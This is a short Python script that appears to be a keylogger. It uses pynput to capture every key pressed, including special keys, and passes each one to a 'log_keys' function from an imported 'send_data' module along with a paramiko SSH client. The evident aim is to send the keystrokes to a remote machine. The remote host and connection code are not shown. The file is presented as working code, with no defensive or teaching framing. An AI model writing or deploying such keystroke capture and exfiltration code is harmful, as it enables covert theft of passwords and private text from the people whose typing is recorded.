from pynput.keyboard import Key, Listener
import paramiko
from send_data import log_keys

def on_press(key):
    try:
        log_keys(client, content_to_write = f"{key.char}")
        # Writing the key to a file or processing it
    except AttributeError:
        # Special keys (like space and enter) are handled here
        log_keys(client, content_to_write = f"[{key}]")

def on_release(key):
    # Stop listener
    if key == Key.esc:
        return False

# Create an SSH client
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# Collecting events until stopped
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
